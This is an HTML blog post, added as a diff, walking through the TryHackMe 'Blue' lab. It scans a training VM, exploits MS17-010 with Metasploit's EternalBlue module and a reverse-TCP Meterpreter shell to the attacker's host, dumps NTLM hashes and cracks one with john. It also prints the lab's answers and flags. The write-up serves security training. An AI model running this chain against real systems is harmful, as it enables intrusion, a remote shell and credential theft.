@@ -1,0 +1,571 @@
+<!DOCTYPE html>
+<html lang="en-us"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <meta name="generator" content="Hugo 0.78.1" />
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://shiny-labs.re/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://shiny-labs.re/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://shiny-labs.re/favicon-16x16.png">
+    <link rel="manifest" href="https://shiny-labs.re/site.webmanifest">
+    <link rel="mask-icon" href="https://shiny-labs.re/safari-pinned-tab.svg" color="#000000">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="theme-color" content="#ffffff">
+
+
+    <link rel="stylesheet" href="https://shiny-labs.re/css/bulma.min.css">
+    <link rel="stylesheet" href="https://shiny-labs.re/css/main.css">
+    <link rel="stylesheet" href="https://shiny-labs.re/css/syntax.css">
+
+    
+    <title>shiny-labs || TryHackMe - Blue</title>
+</head>
+<body><nav class="navbar" role="navigation" aria-label="main navigation">
+    <div class="navbar-brand">
+        <a class="navbar-item no-squiggly" href="https://shiny-labs.re/">
+            <h1 id="logo" class="glitch">shiny-labs</h1>
+        </a>
+    </div>
+
+    <div class="navbar-menu">
+        <div class="navbar-start">
+            
+        </div>
+
+        <div class="navbar-end">
+            
+            <h3 id="subtitle">Exploit, reverse engineering and cats.</h3>
+        </div>
+    </div>
+</nav>
+
+<div id="content">
+
+            <div class="columns is-centered">
+                <div class="column is-three-fifths" id="menu-column"><div id="menu" class="tabs is-centered is-medium">
+    <ul>
+            <li><a href="https://shiny-labs.re/" class="no-squiggly">Home</a></li>
+            <li><a href="https://shiny-labs.re/archives/" class="no-squiggly">Archives</a></li>
+            <li><a href="https://shiny-labs.re/tags/" class="no-squiggly">Tags</a></li>
+            <li><a href="https://shiny-labs.re/about/" class="no-squiggly">About</a></li>
+  </ul>
+</div>
+
+<div class="columns">
+<div class="column is-10" id="main-column">
+    <article class="article">
+        <div >
+            <h1 class="article-title">TryHackMe - Blue</h1>
+            
+<div class="post-meta">
+  <p class="article-meta">
+  <span>Date</span> &#x5b;
+  <time datetime="November 21, 2020">
+      Nov 21
+    </time>
+  &#x5d;
+        
+        
+  <span>Categories</span> &#x5b;
+    <a href="https://shiny-labs.re/categories/pentest">pentest</a>
+  &#x5d;
+        
+        
+  <span>Series</span> &#x5b;
+    <a href="https://shiny-labs.re/series/tryhackme">tryhackme</a>
+  &#x5d;
+        
+        
+  <span>Tags</span> &#x5b;
+    <a href="https://shiny-labs.re/tags/windows">windows</a>
+    <a href="https://shiny-labs.re/tags/eternalblue">eternalblue</a>
+  &#x5d;
+  </p>
+</div>
+
+        </div>
+        <div>
+            <h1 id="description">Description</h1>
+<blockquote>
+<p>Scan and learn what exploit this machine is vulnerable to. Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up. This room is not meant to be a boot2root CTF, rather, this is an educational series for complete beginners. Professionals will likely get very little out of this room beyond basic practice as the process here is meant to be beginner-focused.</p>
+<p>Link to Ice, the sequel to Blue: Link</p>
+<p>You can check out the third box in this series, Blaster, here: Link</p>
+<p>The virtual machine used in this room (Blue) can be downloaded for offline usage from <a href="https://darkstar7471.com/resources.html">https://darkstar7471.com/resources.html</a></p>
+</blockquote>
+<h1 id="task-1-recon">Task 1 Recon</h1>
+<blockquote>
+<p>Scan the machine. (If you are unsure how to tackle this, I recommend checking out the room RP: Nmap)</p>
+</blockquote>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">export</span> <span class="nv">ip</span><span class="o">=</span>10.10.99.22
+</code></pre></div><p>Run a Nmap TCP scan on all ports:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ sudo nmap -sS -p- $ip
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-21 08:31 CET
+Stats: 0:08:23 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 73.23% done; ETC: 08:42 (0:03:04 remaining)
+Stats: 0:10:43 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 89.69% done; ETC: 08:43 (0:01:14 remaining)
+Nmap scan report for 10.10.99.22
+Host is up (0.057s latency).
+Not shown: 65527 closed ports
+PORT      STATE SERVICE
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+49152/tcp open  unknown
+49153/tcp open  unknown
+49154/tcp open  unknown
+49158/tcp open  unknown
+49160/tcp open  unknown
+</code></pre></div><blockquote>
+<p>How many ports are open with a port number under 1000?</p>
+</blockquote>
+<p>Answer: <code>3</code></p>
+<blockquote>
+<p>What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)</p>
+</blockquote>
+<p>Run a Nmap scan for smb related vulnerabilities:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ sudo nmap -sC -sV -p 139 --script smb-vuln* $ip
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-21 08:57 CET
+Nmap scan report for 10.10.99.22
+Host is up (0.16s latency).
+
+PORT    STATE SERVICE     VERSION
+139/tcp open  netbios-ssn Microsoft Windows netbios-ssn
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
+| smb-vuln-ms17-010:
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.19 seconds
+</code></pre></div><p>Answer: <code>ms17-010</code></p>
+<h1 id="task-2-gain-access">Task 2 Gain Access</h1>
+<blockquote>
+<p>Exploit the machine and gain a foothold.</p>
+</blockquote>
+<blockquote>
+<p>Start Metasploit</p>
+</blockquote>
+<p>Run <code>msfconsole</code>, the <code>-q</code> option is to avoid printing the huge banner:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ msfconsole -q
+msf5 &gt;
+</code></pre></div><blockquote>
+<p>Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/&hellip;&hellip;..)</p>
+</blockquote>
+<p>Use the <code>search</code> command:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">msf5 &gt; search ms17-010
+
+Matching Modules
+================
+
+   #  Name                                           Disclosure Date  Rank     Check  Description
+   -  ----                                           ---------------  ----     -----  -----------
+   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
+   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
+   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
+</code></pre></div><p>answer: <code>exploit/windows/smb/ms17_010_eternalblue</code></p>
+<blockquote>
+<p>Show options and set the one required value. What is the name of this value? (All caps for submission)</p>
+</blockquote>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">msf5 &gt; use exploit/windows/smb/ms17_010_eternalblue
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+msf5 exploit(windows/smb/ms17_010_eternalblue) &gt;
+</code></pre></div><p>Show the options of the module:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; show options
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
+   LHOST     172.16.149.138   yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
+</code></pre></div><p>The only required option to set is RHOSTS.</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOSTS  10.10.99.22
+RHOSTS =&gt; 10.10.99.22
+</code></pre></div><p>But we also need to set LHOST because Metasploit takes the IP of your Ethernet interface not the one used by the <code>tun0</code> interface which has access to the VPN:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set LHOST tun0
+LHOST =&gt; tun0
+</code></pre></div><p>Answer: <code>RHOSTS</code></p>
+<blockquote>
+<p>Run the exploit!</p>
+</blockquote>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">[*] Started reverse TCP handler on 10.8.130.13:4444
+[*] 10.10.99.22:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 10.10.99.22:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+[*] 10.10.99.22:445       - Scanned 1 of 1 hosts (100% complete)
+[*] 10.10.99.22:445 - Connecting to target for exploitation.
+[+] 10.10.99.22:445 - Connection established for exploitation.
+[+] 10.10.99.22:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 10.10.99.22:445 - CORE raw buffer dump (42 bytes)
+[*] 10.10.99.22:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
+[*] 10.10.99.22:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
+[*] 10.10.99.22:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1
+[+] 10.10.99.22:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 10.10.99.22:445 - Trying exploit with 12 Groom Allocations.
+[*] 10.10.99.22:445 - Sending all but last fragment of exploit packet
+[*] 10.10.99.22:445 - Starting non-paged pool grooming
+[+] 10.10.99.22:445 - Sending SMBv2 buffers
+[+] 10.10.99.22:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 10.10.99.22:445 - Sending final SMBv2 buffers.
+[*] 10.10.99.22:445 - Sending last fragment of exploit packet!
+[*] 10.10.99.22:445 - Receiving response from exploit packet
+[+] 10.10.99.22:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 10.10.99.22:445 - Sending egg to corrupted connection.
+[*] 10.10.99.22:445 - Triggering free of corrupted buffer.
+[*] Sending stage (201283 bytes) to 10.10.99.22
+[*] Meterpreter session 1 opened (10.8.130.13:4444 -&gt; 10.10.99.22:49180) at 2020-11-21 09:06:57 +0100
+[+] 10.10.99.22:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.99.22:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.99.22:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+meterpreter &gt;
+</code></pre></div><blockquote>
+<p>Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.</p>
+</blockquote>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">meterpreter &gt; background
+[*] Backgrounding session 1...
+</code></pre></div><h1 id="task-3-escalate-privileges">Task 3 Escalate Privileges</h1>
+<blockquote>
+<p>Escalate privileges, learn how to upgrade shells in metasploit.</p>
+</blockquote>
+<blockquote>
+<p>If you haven&rsquo;t already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)</p>
+</blockquote>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; search type:post meterpreter
+
+Matching Modules
+================
+
+   #   Name                                            Disclosure Date  Rank    Check  Description
+   -   ----                                            ---------------  ----    -----  -----------
+   0   post/multi/gather/multi_command                                  normal  No     Multi Gather Run Shell Command Resource File
+   1   post/multi/gather/run_console_rc_file                            normal  No     Multi Gather Run Console Resource File
+   2   post/multi/gather/ubiquiti_unifi_backup                          normal  No     Multi Gather Ubiquiti UniFi Controller Backup
+   3   post/multi/manage/autoroute                                      normal  No     Multi Manage Network Route via Meterpreter Session
+   4   post/multi/manage/record_mic                                     normal  No     Multi Manage Record Microphone
+   5   post/multi/manage/screenshare                                    normal  No     Multi Manage the screen of the target meterpreter session
+   6   post/multi/manage/shell_to_meterpreter                           normal  No     Shell to Meterpreter Upgrade
+   7   post/multi/recon/local_exploit_suggester                         normal  No     Multi Recon Local Exploit Suggester
+   8   post/windows/gather/arp_scanner                                  normal  No     Windows Gather ARP Scanner
+   9   post/windows/gather/wmic_command                                 normal  No     Windows Gather Run Specified WMIC Command
+   10  post/windows/manage/archmigrate                                  normal  No     Architecture Migrate
+   11  post/windows/manage/exec_powershell                              normal  No     Windows Powershell Execution Post Module
+   12  post/windows/manage/execute_dotnet_assembly                      normal  No     Execute .net Assembly (x64 only)
+   13  post/windows/manage/forward_pageant                              normal  No     Forward SSH Agent Requests To Remote Pageant
+   14  post/windows/manage/migrate                                      normal  No     Windows Manage Process Migration
+   15  post/windows/manage/multi_meterpreter_inject                     normal  No     Windows Manage Inject in Memory Multiple Payloads
+   16  post/windows/manage/powershell/exec_powershell                   normal  No     Windows Manage PowerShell Download and/or Execute
+   17  post/windows/manage/priv_migrate                                 normal  No     Windows Manage Privilege Based Process Migration
+</code></pre></div><p>Answer: <code>post/multi/manage/shell_to_meterpreter</code></p>
+<blockquote>
+<p>Select this (use MODULE_PATH). Show options, what option are we required to change? (All caps for answer)</p>
+</blockquote>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; use post/multi/manage/shell_to_meterpreter
+msf5 post(multi/manage/shell_to_meterpreter) &gt;
+msf5 post(multi/manage/shell_to_meterpreter) &gt; show options
+
+Module options (post/multi/manage/shell_to_meterpreter):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
+   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
+   LPORT    4433             yes       Port for payload to connect to.
+   SESSION                   yes       The session to run this module on.
+</code></pre></div><p>Answer: The only required option is <code>SESSION</code>.</p>
+<blockquote>
+<p>Set the required option, you may need to list all of the sessions to find your target here.</p>
+</blockquote>
+<p>List all sessions with <code>sessions</code>:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">msf5 post(multi/manage/shell_to_meterpreter) &gt; sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                   Connection
+  --  ----  ----                     -----------                   ----------
+  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.8.130.13:4444 -&gt; 10.10.99.22:49187 (10.10.99.22)
+</code></pre></div><p>Select it with:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">msf5 post(multi/manage/shell_to_meterpreter) &gt; set SESSION 1
+SESSION =&gt; 1
+</code></pre></div><blockquote>
+<p>Run! If this doesn&rsquo;t work, try completing the exploit from the previous task once more.</p>
+</blockquote>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">msf5 post(multi/manage/shell_to_meterpreter) &gt; run
+
+[!] SESSION may not be compatible with this module.
+[*] Upgrading session ID: 2
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 10.8.130.13:4433
+[-] Post failed: Rex::Post::Meterpreter::RequestError stdapi_sys_process_execute: Operation failed: The system cannot find the file specified.
+[-] Call stack:
+[-]   /opt/metasploit/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:173:in `execute&#39;
+[-]   /opt/metasploit/lib/msf/core/post/common.rb:114:in `cmd_exec&#39;
+[-]   /opt/metasploit/modules/post/multi/manage/shell_to_meterpreter.rb:164:in `run&#39;
+[*] Post module execution completed
+</code></pre></div><p>This fails because we already have a meterpreter session. I don&rsquo;t quite get the purpose of this task, but anyway, here&rsquo;s how you would do it theoretically  :D</p>
+<blockquote>
+<p>Once the meterpreter shell conversion completes, select that session for use.</p>
+</blockquote>
+<p>Using my one and only session&hellip;</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">msf5 post(multi/manage/shell_to_meterpreter) &gt; sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                   Connection
+  --  ----  ----                     -----------                   ----------
+  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.8.130.13:4444 -&gt; 10.10.99.22:49187 (10.10.99.22)
+msf5 post(multi/gather/ubiquiti_unifi_backup) &gt; sessions -i 1
+[*] Starting interaction with 1...
+</code></pre></div><blockquote>
+<p>Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command &lsquo;shell&rsquo; and run &lsquo;whoami&rsquo;. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again.</p>
+</blockquote>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM
+</code></pre></div><blockquote>
+<p>List all of the processes running via the &lsquo;ps&rsquo; command. Just because we are system doesn&rsquo;t mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).</p>
+</blockquote>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">meterpreter &gt; ps
+
+Process List
+============
+
+ PID   PPID  Name                  Arch  Session  User                          Path
+ ---   ----  ----                  ----  -------  ----                          ----
+ 0     0     [System Process]
+ 4     0     System                x64   0
+ 356   704   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+ 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
+ 444   704   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+ 556   548   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 604   548   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
+ 616   596   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 656   596   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
+ 704   604   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
+ 712   604   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
+ 720   604   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
+ 772   704   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+ 828   704   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+ 896   704   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
+ 944   704   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+ 1012  656   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
+ 1076  704   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+ 1168  704   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
+ 1296  704   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
+ 1332  704   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
+ 1392  828   WmiPrvSE.exe
+ 1396  704   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
+ 1472  704   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
+ 1612  704   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
+ 1944  704   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
+ 2136  704   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM
+ 2400  704   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE
+ 2524  704   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+ 2540  704   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM
+ 2600  704   vds.exe               x64   0        NT AUTHORITY\SYSTEM
+</code></pre></div><blockquote>
+<p>Migrate to this process using the &lsquo;migrate PROCESS_ID&rsquo; command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time.</p>
+</blockquote>
+<p>I tried a bunch of <code>svchost.exe</code>:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">meterpreter &gt; migrate 2524
+[*] Migrating from 1296 to 2524...
+[-] core_migrate: Operation failed: Access is denied.
+meterpreter &gt; migrate 356
+[*] Migrating from 1296 to 356...
+[-] core_migrate: Operation failed: Access is denied.
+meterpreter &gt; migrate 444
+[*] Migrating from 1296 to 444...
+[-] core_migrate: Operation failed: Access is denied.
+</code></pre></div><p>None of them worked <code>¯\_(ツ)_/¯</code>, even after rebooting the machine. Nevermind, moving on ~~</p>
+<h1 id="task-4-cracking">Task 4 Cracking</h1>
+<blockquote>
+<p>Dump the non-default user&rsquo;s password and crack it!</p>
+</blockquote>
+<blockquote>
+<p>Within our elevated meterpreter shell, run the command &lsquo;hashdump&rsquo;. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?</p>
+</blockquote>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">meterpreter &gt; hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+</code></pre></div><p>Answer:  <code>Jon</code></p>
+<blockquote>
+<p>Copy this password hash to a file and research how to crack it. What is the cracked password?</p>
+</blockquote>
+<p>Save the hash of Jon&rsquo;s password in a file `hashdump.txt</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">echo &#34;Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::&#34; &gt; hashdump.txt
+</code></pre></div><p>Let&rsquo;s save this as hashdump.txt and run john on it:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ john --format=nt --wordlist=/usr/share/dict/rockyou.txt hashdump.txt
+Created directory: /home/moo/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (NT [MD4 128/128 AVX 4x3])
+Warning: no OpenMP support for this hash type, consider --fork=2
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+alqfna22         (Jon)
+1g 0:00:00:00 DONE (2020-11-21 09:43) 2.439g/s 8928Kp/s 8928Kc/s 8928KC/s alqasssab25..alquimia521
+Use the &#34;--show --format=NT&#34; options to display all of the cracked passwords reliably
+Session completed
+</code></pre></div><p>Answer: <code>alqfna22</code></p>
+<h1 id="task-5-find-flags">Task 5 Find Flags!</h1>
+<blockquote>
+<p>Find the three flags planted on this machine.</p>
+<p>Completed Blue? Check out Ice: Link</p>
+<p>You can check out the third box in this series, Blaster, here: Link</p>
+</blockquote>
+<blockquote>
+<p>Flag1? (Only submit the flag contents {CONTENTS})</p>
+</blockquote>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">meterpreter &gt; dir
+Listing: C:\
+============
+
+Mode              Size      Type  Last modified              Name
+----              ----      ----  -------------              ----
+40777/rwxrwxrwx   0         dir   2009-07-14 05:18:56 +0200  $Recycle.Bin
+40777/rwxrwxrwx   0         dir   2009-07-14 07:08:56 +0200  Documents and Settings
+40777/rwxrwxrwx   0         dir   2009-07-14 05:20:08 +0200  PerfLogs
+40555/r-xr-xr-x   4096      dir   2009-07-14 05:20:08 +0200  Program Files
+40555/r-xr-xr-x   4096      dir   2009-07-14 05:20:08 +0200  Program Files (x86)
+40777/rwxrwxrwx   4096      dir   2009-07-14 05:20:08 +0200  ProgramData
+40777/rwxrwxrwx   0         dir   2018-12-13 04:13:22 +0100  Recovery
+40777/rwxrwxrwx   4096      dir   2018-12-13 00:01:17 +0100  System Volume Information
+40555/r-xr-xr-x   4096      dir   2009-07-14 05:20:08 +0200  Users
+40777/rwxrwxrwx   16384     dir   2009-07-14 05:20:08 +0200  Windows
+100666/rw-rw-rw-  24        fil   2018-12-13 04:47:39 +0100  flag1.txt
+0000/---------    57696592  fif   1971-10-30 20:58:24 +0100  hiberfil.sys
+0000/---------    57696592  fif   1971-10-30 20:58:24 +0100  pagefile.sys
+
+meterpreter &gt; cat flag1.txt
+flag{access_the_machine}
+</code></pre></div><p>Answer: <code>access_the_machine</code></p>
+<blockquote>
+<p>Flag2? *Errata: Windows really doesn&rsquo;t like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen.</p>
+</blockquote>
+<p>Spawn a Windows cmd and use the searching option <code>/s</code> of dir to locate <code>flag2.txt</code> on <code>C:</code>:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">meterpreter &gt; shell
+Process 1124 created.
+Channel 4 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+C:\&gt;dir /s C:\flag2.txt
+dir /s C:\flag2.txt
+ Volume in drive C has no label.
+ Volume Serial Number is E611-0B66
+
+ Directory of C:\Windows\System32\config
+
+03/17/2019  01:32 PM                34 flag2.txt
+               1 File(s)             34 bytes
+C:\&gt;type C:\Windows\System32\config\flag2.txt
+type C:\Windows\System32\config\flag2.txt
+flag{sam_database_elevated_access}
+
+</code></pre></div><p>Answer: <code>sam_database_elevated_access</code></p>
+<blockquote>
+<p>flag3?</p>
+</blockquote>
+<p>Same procedure than for flag2:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">C:\&gt;dir /s C:\flag3.txt
+dir /s C:\flag3.txt
+ Volume in drive C has no label.
+ Volume Serial Number is E611-0B66
+
+ Directory of C:\Users\Jon\Documents
+
+03/17/2019  01:26 PM                37 flag3.txt
+               1 File(s)             37 bytes
+
+     Total Files Listed:
+               1 File(s)             37 bytes
+               0 Dir(s)  20,619,083,776 bytes free
+C:\&gt;type C:\Users\Jon\Documents\flag3.txt
+type C:\Users\Jon\Documents\flag3.txt
+flag{admin_documents_can_be_valuable}
+</code></pre></div><p>Answer: <code>admin_documents_can_be_valuable</code></p>
+
+        </div>
+    </article>
+</div>
+
+
+<div class="column" id="toc-column">    <aside>
+        <div id="toc">
+            What's on this page?
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#description">Description</a></li>
+    <li><a href="#task-1-recon">Task 1 Recon</a></li>
+    <li><a href="#task-2-gain-access">Task 2 Gain Access</a></li>
+    <li><a href="#task-3-escalate-privileges">Task 3 Escalate Privileges</a></li>
+    <li><a href="#task-4-cracking">Task 4 Cracking</a></li>
+    <li><a href="#task-5-find-flags">Task 5 Find Flags!</a></li>
+  </ul>
+</nav>
+        </div>
+    </aside>
+
+</div>
+
+</div></div>
+            </div><footer class="footer">
+  <div class="content has-text-centered">
+    <p>
+        <div class="copyright">
+        
+            Handcrafted with <span style="color: #e25555;">&hearts;</span> by kylma
+        
+        </div>
+
+    </p>
+  </div>
+
